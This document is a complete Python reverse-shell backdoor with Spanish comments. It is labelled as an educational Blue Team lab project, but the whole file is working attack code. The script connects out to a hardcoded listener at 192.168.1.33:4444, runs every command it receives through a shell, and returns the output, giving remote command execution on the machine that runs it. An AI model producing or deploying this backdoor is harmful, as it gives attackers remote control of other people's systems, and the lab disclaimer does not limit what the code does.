#!/usr/bin/env python3
# =============================================================================
# REVERSE SHELL - LADO DE LA VÍCTIMA
# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
# ADVERTENCIA: Solo usar en laboratorio aislado propio
# COMPATIBILIDAD: Windows + Linux
# =============================================================================

import socket, subprocess, sys

class Backdoor:

    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip,port))  # ← ✅ IP CORRECTA (tu Manjaro)
        self.connection.send(b" \n [+]Conexion Exitosamente Establecida \n")

    def ejecutarComando(self,command):
        try:
            command_str = command.decode('utf-8', errors='ignore').strip()
            return subprocess.check_output(command_str, shell=True, stderr=subprocess.STDOUT)
        except Exception as e:
            # ← ✅ Si falla, devolver el error en vez de crashear
            return str(e).encode('utf-8')

    def run(self):
        while True: 
            command = self.connection.recv(1024000)
            command_str = command.decode('utf-8', errors='ignore').strip()  # ← ✅ DECODIFICAR
            
            # ← ✅ CHECK ANTES DE EJECUTAR
            if command_str == "salir":
                self.connection.close()
                exit()
            
            resultadosComando = self.ejecutarComando(command)
            self.connection.send(resultadosComando)           


puerta = Backdoor("192.168.1.33",4444)
puerta.run()
